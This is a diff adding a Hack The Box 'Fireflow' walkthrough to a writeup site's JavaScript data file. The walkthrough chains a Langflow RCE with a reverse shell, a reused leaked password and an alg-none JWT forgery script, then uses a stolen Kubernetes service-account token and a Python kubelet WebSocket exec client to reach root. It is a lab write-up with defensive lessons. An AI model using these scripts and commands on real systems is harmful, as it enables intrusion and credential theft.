@@ -1,3 +1,26 @@
+/* ============================================================
+   WRITEUPS DATA
+   Add a new writeup by pushing a new object into WRITEUPS below.
+   Nothing else needs to change — the homepage card, search index,
+   filters, sort order, and the writeup page are all generated
+   from this array.
+
+   slug          — unique, used in writeup.html?slug=<slug>
+   title         — card + page title
+   platform      — "Hack The Box" | "TryHackMe" | "CTF" | "Bug Bounty" | "Personal Lab"
+   platformShort — short label for the page header, e.g. "HTB"
+   os            — "Linux" | "Windows" | "Android" | "Web"
+   difficulty    — "Easy" | "Medium" | "Hard" | "Insane"
+   categories    — array, used by the Category filter
+   tags          — array, shown as chips, clickable -> search
+   date          — ISO yyyy-mm-dd, used for sorting
+   dateDisplay   — human readable date shown on the page/card
+   cover         — path to a cover image
+   excerpt       — one-line summary for the card
+   sample        — true marks it as placeholder/demo content
+   sections      — ordered array of {id, title, html}
+============================================================ */
+
 const DIFFICULTY_ORDER = { "Easy": 1, "Medium": 2, "Hard": 3, "Insane": 4 };
 
 const WRITEUPS = [
@@ -574,8 +597,292 @@ Password: Buck3tH4tf0rm3!</code></pre>
         html: `<ul class="tools-list"><li>Nmap</li><li>ffuf</li><li>Wireshark</li><li>sshpass / ssh</li><li>getcap</li><li>GTFOBins (Python)</li></ul>`
       }
     ]
+  },
+    {
+    slug: "htb-fireflow",
+    title: "HTB — Fireflow",
+    platform: "Hack The Box",
+    platformShort: "HTB",
+    os: "Linux",
+    difficulty: "Medium",
+    categories: ["Web", "Exploitation", "Privilege Escalation", "Enumeration"],
+    tags: ["Linux", "Langflow", "RCE", "JWT", "Kubernetes", "PrivilegeEscalation"],
+    date: "2026-10-21",
+    dateDisplay: "21 October 2026",
+    cover: "assets/writeups/htb-fireflow/cover.png",
+    excerpt: "An unauthenticated Langflow RCE, a leaked password, a forged alg-none JWT, and a Kubernetes service-account pivot straight to a privileged node-exporter pod.",
+    sample: false,
+    sections: [
+      {
+        id: "overview",
+        title: "Overview",
+        html: `<p>Fireflow is a medium-difficulty Linux box built around a fictional intelligence unit
+          called Task Force Nightfall. On the surface it's a single web app, but underneath it's
+          really three separate environments stacked on top of each other: a public-facing
+          Langflow AI-workflow builder, a Linux host behind it, and a full Kubernetes cluster
+          running alongside both. Compromising the box means walking through all three in
+          sequence.</p>
+          <p>The outline is straightforward even though the box is not: an unauthenticated remote
+          code execution bug in Langflow gets a shell as a low-privileged web user, a leaked
+          environment variable hands over a reused password for a real system account, a config
+          file left in that account's home directory leaks credentials to an internal AI tool
+          registry, a broken JWT implementation on that registry lets any authenticated user mint
+          themselves an admin token, and the admin capability on that registry turns out to be
+          arbitrary code execution inside a Kubernetes pod. From there it's standard
+          container-breakout territory: a service account token with just enough permission to
+          proxy through the Kubernetes API straight to a privileged monitoring pod that happens to
+          run as root with the host filesystem mounted underneath it.</p>`
+      },
+      {
+        id: "enumeration",
+        title: "Enumeration",
+        html: `<p>A normal full-port Nmap scan against the box only turned up two services:</p>
+          <pre class="code-block" data-lang="bash"><code>nmap -sC -sV -p- -Pn TARGET_IP</code></pre>
+          <pre class="code-block code-output" data-lang="text"><code>22/tcp  open  ssh     OpenSSH
+443/tcp open  https   nginx (self-signed certificate)</code></pre>
+          <img src="assets/writeups/htb-fireflow/01-nmap-scan.png" alt="Full nmap scan showing ports 22 and 443 open" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>What stood out immediately was the certificate on port 443: the subject and SAN both
+          referenced <code>fireflow.htb</code> and a wildcard, <code>*.fireflow.htb</code>. A
+          wildcard cert on a CTF box is almost always a signpost that virtual hosting is in play,
+          so I added the apex domain to <code>/etc/hosts</code> before going any further:</p>
+          <pre class="code-block" data-lang="bash"><code>echo "TARGET_IP fireflow.htb" | sudo tee -a /etc/hosts</code></pre>
+          <img src="assets/writeups/htb-fireflow/02-etc-hosts.png" alt="Adding fireflow.htb to /etc/hosts" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>Browsing to the main site showed a clean, static landing page for Task Force
+          Nightfall's internal platform, with a single call-to-action button advertising an AI
+          agent.</p>
+          <img src="assets/writeups/htb-fireflow/03-landing-page.png" alt="Fireflow / Task Force Nightfall homepage" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>The button linked out to a subdomain rather than a path, so I ran a directory sweep
+          and a vhost fuzz against the apex domain to confirm it:</p>
+          <pre class="code-block" data-lang="bash"><code>feroxbuster -u https://fireflow.htb/ -k</code></pre>
+          <pre class="code-block" data-lang="bash"><code>ffuf -u https://TARGET_IP/ -H "Host: FUZZ.fireflow.htb" -w subdomains.txt -c -ic -ac</code></pre>
+          <img src="assets/writeups/htb-fireflow/04-ffuf-vhost.png" alt="Directory results tail and ffuf vhost fuzz finding flow.fireflow.htb" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>That turned up <code>flow.fireflow.htb</code>, which I also dropped into
+          <code>/etc/hosts</code>. Following the button through led to a Langflow "Agent Dev"
+          playground at a URL carrying a flow UUID:</p>
+          <pre class="code-block" data-lang="text"><code>https://flow.fireflow.htb/playground/FLOW_ID</code></pre>
+          <img src="assets/writeups/htb-fireflow/05-langflow-playground.png" alt="Langflow Agent Dev playground page" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>The playground's status bar quietly gave away the version in use — Langflow 1.8.2. A
+          quick search against that version number turned up <b>CVE-2026-33017</b>, an
+          unauthenticated remote code execution bug in Langflow's public flow build process: the
+          server will take a JSON-described flow graph, including custom Python component code,
+          and compile and execute it without sandboxing or authentication, as long as it's aimed
+          at a flow that's already public.</p>`
+      },
+      {
+        id: "initial-access",
+        title: "Initial Access",
+        html: `<p>Rather than build the exploit JSON by hand, I used a public proof-of-concept
+          script for CVE-2026-33017 that packages the whole thing up. Before running anything
+          against the target I read through the script itself — you give it the target URL, the
+          public flow ID pulled from the playground link, and a callback host and port, and it
+          handles crafting a valid flow graph with a malicious Python component embedded inside
+          it:</p>
+          <img src="assets/writeups/htb-fireflow/06-exploit-script.png" alt="exploit.py source open in Mousepad" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <pre class="code-block" data-lang="bash"><code>python3 exploit.py --url https://flow.fireflow.htb/ --flow-id FLOW_ID --lhost LHOST --lport LPORT</code></pre>
+          <img src="assets/writeups/htb-fireflow/07-exploit-run.png" alt="Running exploit.py against the target" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>With a listener running and the script pointed at the target, the callback landed
+          almost immediately:</p>
+          <pre class="code-block" data-lang="bash"><code>nc -nvlp 4444</code></pre>
+          <img src="assets/writeups/htb-fireflow/08-reverse-shell.png" alt="nc listener catching the www-data reverse shell" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <pre class="code-block code-output" data-lang="text"><code>$ whoami
+www-data</code></pre>
+          <p>The underlying bug is the same regardless of how you trigger it: the build endpoint
+          walks an attacker-supplied flow graph and compiles each node's custom component code,
+          and a plain top-level assignment statement inside that code gets executed as a side
+          effect of compiling the class, before the flow itself ever actually runs. Wrap that
+          assignment in just enough boilerplate to pass the server's structural validation and you
+          have unauthenticated RCE.</p>
+          <p>Once in as <code>www-data</code>, I dumped the process environment, since application
+          secrets and credentials frequently leak that way:</p>
+          <pre class="code-block" data-lang="bash"><code>env</code></pre>
+          <img src="assets/writeups/htb-fireflow/09-env-dump.png" alt="env output leaking LANGFLOW_SUPERUSER_PASSWORD" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>Sitting right there was <code>LANGFLOW_SUPERUSER_PASSWORD</code>. Checking
+          <code>/etc/passwd</code> for interactive accounts turned up exactly one real user besides
+          root:</p>
+          <pre class="code-block" data-lang="bash"><code>cat /etc/passwd</code></pre>
+          <img src="assets/writeups/htb-fireflow/10-etc-passwd.png" alt="/etc/passwd listing showing the nightfall user" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>Password reuse between an application's own superuser account and a real system
+          account is one of the most common misconfigurations out there, so I tried the Langflow
+          password directly against <code>nightfall</code> over SSH rather than spawning a
+          <code>su</code> session from the web shell:</p>
+          <pre class="code-block" data-lang="bash"><code>ssh nightfall@fireflow.htb</code></pre>
+          <img src="assets/writeups/htb-fireflow/11-ssh-login.png" alt="SSH login as nightfall accepting the host key" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>It worked, and the user flag was sitting in the home directory:</p>
+          <pre class="code-block" data-lang="bash"><code>whoami
+cat user.txt</code></pre>
+          <img src="assets/writeups/htb-fireflow/12-user-flag.png" alt="whoami confirming nightfall, and the user flag" class="writeup-img" data-lightbox="gallery-htb-fireflow">`
+      },
+      {
+        id: "privilege-escalation",
+        title: "Privilege Escalation",
+        html: `<p><code>sudo -l</code> came back empty and a quick SUID sweep didn't turn up
+          anything useful, so I went looking through nightfall's home directory instead. A hidden
+          <code>.mcp</code> folder held a <code>config.json</code> with credentials for something
+          I hadn't seen yet:</p>
+          <pre class="code-block" data-lang="bash"><code>cat .mcp/config.json</code></pre>
+          <img src="assets/writeups/htb-fireflow/13-mcp-config.png" alt=".mcp/config.json contents leaking MCP tool registry credentials" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>Port 30080 wasn't something Nmap had surfaced from outside, which made sense once I
+          realized it was a Kubernetes NodePort — reachable directly on the node's IP without
+          needing to be on the pod network. Querying the service's version endpoint described it
+          as an MCP (Model Context Protocol) AI Tool Registry, and its self-documented auth block
+          was the real find: alongside the expected HS256 signing algorithm, it also listed
+          <code>none</code> as a supported JWT algorithm.</p>
+          <pre class="code-block" data-lang="bash"><code>curl http://TARGET_IP:30080/api/v1/version</code></pre>
+          <img src="assets/writeups/htb-fireflow/14-mcp-version.png" alt="Version endpoint response listing JWT alg: none as supported" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>Supporting <code>alg: none</code> means the server will accept a JWT with an empty
+          signature and trust whatever claims are inside it — a classic JWT implementation flaw. I
+          authenticated normally first with the leaked credentials to see what a legitimate token
+          looked like:</p>
+          <pre class="code-block" data-lang="bash"><code>curl -X POST http://TARGET_IP:30080/api/v1/auth \\
+  -H 'Content-Type: application/json' \\
+  -d '{"username":"langflow-bot","password":"REDACTED"}'</code></pre>
+          <img src="assets/writeups/htb-fireflow/15-mcp-auth-token.png" alt="Legitimate role:user token returned by the auth endpoint" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>Decoding the returned token showed a payload along the lines of
+          <code>sub: langflow-bot, role: user</code>. Since registering new tools on the registry
+          was gated behind an admin role, I wrote a small script to forge my own token with the
+          role bumped up and the algorithm set to <code>none</code>:</p>
+          <img src="assets/writeups/htb-fireflow/16-jwt-forge-script.png" alt="jwt.py forging script open in Mousepad" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <pre class="code-block" data-lang="python"><code>import jwt
+print(jwt.encode({"sub": "langflow-bot", "role": "admin"}, key="", algorithm="none"))</code></pre>
+          <img src="assets/writeups/htb-fireflow/17-jwt-forged-token.png" alt="Running jwt.py and printing the forged alg:none admin token" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>Before reaching for a real payload, I proved the admin token actually worked by
+          registering a harmless test tool first:</p>
+          <pre class="code-block" data-lang="bash"><code>curl -X POST http://TARGET_IP:30080/api/v1/tools \\
+  -H "Authorization: Bearer ADMIN_JWT" \\
+  -H 'Content-Type: application/json' \\
+  -d '{"name":"x","description":"x","code":"print(1)"}'</code></pre>
+          <img src="assets/writeups/htb-fireflow/18-register-test-tool.png" alt="Registering the harmless test tool x with the admin token" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <pre class="code-block" data-lang="bash"><code>curl -X POST http://TARGET_IP:30080/mcp \\
+  -H "Authorization: Bearer ADMIN_JWT" \\
+  -H 'Content-Type: application/json' \\
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"x","arguments":{}}}'</code></pre>
+          <img src="assets/writeups/htb-fireflow/19-verify-rce.png" alt="Calling tool x and getting back text: 1, confirming code execution" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>With RCE confirmed, I registered the real payload — a tool whose code field was a
+          small self-restarting Python reverse shell:</p>
+          <pre class="code-block" data-lang="bash"><code>curl -X POST http://TARGET_IP:30080/api/v1/tools \\
+  -H "Authorization: Bearer ADMIN_JWT" \\
+  -H 'Content-Type: application/json' \\
+  -d '{"name":"exploitnotes","description":"notes","code":"REVERSE_SHELL_PY"}'</code></pre>
+          <img src="assets/writeups/htb-fireflow/20-register-shell-tool.png" alt="Registering the exploitnotes reverse-shell tool" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>The pod kept restarting and dropping the shell every time it got invoked, so rather
+          than re-running the two curl commands by hand each time, I wrapped them in a small
+          script that registers the tool and immediately triggers it:</p>
+          <pre class="code-block" data-lang="bash"><code>#!/bin/bash
+# shell.sh — register the exploitnotes tool and trigger it in one shot
+curl -s -X POST http://TARGET_IP:30080/api/v1/tools \\
+  -H "Authorization: Bearer ADMIN_JWT" \\
+  -H 'Content-Type: application/json' \\
+  -d '{"name":"exploitnotes","description":"notes","code":"REVERSE_SHELL_PY"}' > /dev/null
+
+curl -s -X POST http://TARGET_IP:30080/mcp \\
+  -H "Authorization: Bearer ADMIN_JWT" \\
+  -H 'Content-Type: application/json' \\
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"exploitnotes","arguments":{}}}' > /dev/null</code></pre>
+          <img src="assets/writeups/htb-fireflow/21-shell-persistence-script.png" alt="shell.sh wrapper script and it being run" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>The listener caught a connection, and the hostname confirmed I was inside a
+          Kubernetes pod rather than back on the Linux host:</p>
+          <pre class="code-block code-output" data-lang="text"><code>$ id
+uid=1000(mcp) gid=65534(nobody)
+$ hostname
+mcp-server-HASH</code></pre>
+          <img src="assets/writeups/htb-fireflow/22-mcp-pod-shell.png" alt="Listener catching the mcp-server pod shell" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>A quick check of the environment confirmed it was a genuine Kubernetes workload and
+          not just a container named to look like one:</p>
+          <pre class="code-block" data-lang="bash"><code>env | grep -i kubernetes</code></pre>
+          <img src="assets/writeups/htb-fireflow/23-k8s-env.png" alt="env | grep -i kubernetes confirming a Kubernetes pod" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>Every pod running with a service account mounts that account's token at a predictable
+          path, so I grabbed it to interact with the Kubernetes API directly:</p>
+          <pre class="code-block" data-lang="bash"><code>cat /var/run/secrets/kubernetes.io/serviceaccount/token</code></pre>
+          <p>The service account turned out to carry just one meaningful permission beyond the
+          basics: <code>get</code> on <code>nodes/proxy</code>. That single permission is enough
+          to turn the Kubernetes API server into a pass-through to the kubelet running on the
+          node — effectively talking to the kubelet's own HTTP API at a nodes proxy path without
+          ever needing direct network access to port 10250.</p>
+          <p>Using that proxy path, I listed the pods scheduled on the node and found one that
+          immediately stood out: a <code>prometheus-node-exporter</code> pod in the
+          <code>monitoring</code> namespace. By design, node-exporter pods run as root, mount the
+          host's root filesystem so they can report real disk and system metrics, and run with
+          <code>hostPID</code> and <code>hostNetwork</code> enabled — which makes a node-exporter
+          pod one of the best container-escape targets you can find in any cluster.</p>
+          <p>The kubelet's exec endpoint runs over a WebSocket rather than plain HTTP, and
+          critically it's not gated by the same <code>create</code> permission the API server
+          enforces on the HTTP exec path — a <code>get</code>-level token is enough to open the
+          WebSocket channel and run a command inside the target container. I wrote a small Python
+          client, <code>/tmp/evil.py</code>, that connects straight to the kubelet's exec
+          WebSocket, authenticates with the stolen service account token, and runs a command
+          inside the node-exporter container:</p>
+          <img src="assets/writeups/htb-fireflow/24-evil-py-script.png" alt="/tmp/evil.py WebSocket exec script being written" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <pre class="code-block" data-lang="python"><code>import asyncio, ssl, sys, websockets
+
+TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
+URL = (
+    "wss://NODE_IP:10250/exec/monitoring/"
+    "prometheus-prometheus-node-exporter-xxxxx/node-exporter"
+    "?output=1&error=1&command=" + "&command=".join(sys.argv[1].split())
+)
+
+async def run():
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    async with websockets.connect(
+        URL, ssl=ctx,
+        additional_headers={"Authorization": "Bearer " + TOKEN},
+        subprotocols=["v4.channel.k8s.io"]
+    ) as ws:
+        while True:
+            data = await ws.recv()
+            print(data[1:].decode(errors="replace"), end="")
+
+asyncio.run(run())</code></pre>
+          <pre class="code-block" data-lang="bash"><code>python3 evil.py "id"</code></pre>
+          <pre class="code-block code-output" data-lang="text"><code>uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)</code></pre>
+          <img src="assets/writeups/htb-fireflow/25-root-id.png" alt="python3 evil.py id returning uid=0(root)" class="writeup-img" data-lightbox="gallery-htb-fireflow">
+          <p>Root, inside a container whose whole job is to mirror the host filesystem.</p>`
+      },
+      {
+        id: "proof",
+        title: "Proof / Flags",
+        html: `<p><b>User flag</b> — retrieved from nightfall's home directory after reusing the
+          leaked Langflow superuser password over SSH.</p>
+          <p><b>Root flag</b> — read through the node-exporter pod's host filesystem mount after a
+          direct WebSocket exec to the kubelet as root.</p>
+          <pre class="code-block" data-lang="bash"><code>python3 evil.py "cat /host/root/root/root.txt"</code></pre>`
+      },
+      {
+        id: "lessons-learned",
+        title: "Lessons Learned",
+        html: `<ul>
+            <li><b>AI workflow builders that execute user-supplied code need real sandboxing, not
+              just an auth check.</b> The underlying flaw here wasn't missing authentication so
+              much as arbitrary code execution by design on a code path that happened to also skip
+              authentication.</li>
+            <li><b>Secrets don't belong in process environment variables for production
+              services.</b> A superuser password sitting in <code>env</code> output is one
+              <code>www-data</code> shell away from a full account takeover.</li>
+            <li><b>Password reuse between service accounts and real system accounts collapses your
+              whole privilege boundary into one secret.</b> One leaked application password became
+              a direct SSH login.</li>
+            <li><b>Never advertise <code>alg: none</code> as a supported JWT algorithm, and never
+              trust the algorithm field in an incoming token at all.</b> The verifier should pin
+              the expected algorithm itself rather than reading it from the token.</li>
+            <li><b><code>nodes/proxy</code> with <code>get</code> is a far more dangerous
+              permission than it looks.</b> It was enough, on its own, to pivot from a single
+              compromised pod to arbitrary command execution on any other pod on the same node,
+              including ones running as root with the host filesystem mounted.</li>
+            <li><b>Monitoring and metrics pods are frequently the most privileged thing running in
+              a cluster.</b> node-exporter needs root and a host mount to do its job honestly,
+              which makes it one of the first things worth checking for in any Kubernetes
+              pentest.</li>
+          </ul>`
+      },
+      {
+        id: "tools-used",
+        title: "Tools Used",
+        html: `<ul class="tools-list"><li>Nmap</li><li>ffuf</li><li>FeroxBuster</li><li>CVE-2026-33017 PoC</li><li>SSH</li><li>curl</li><li>PyJWT</li><li>Kubernetes API Proxy</li><li>Python (websockets)</li></ul>`
+      }
+    ]
   }
 ];
-
 
 WRITEUPS.sort((a, b) => new Date(b.date) - new Date(a.date));
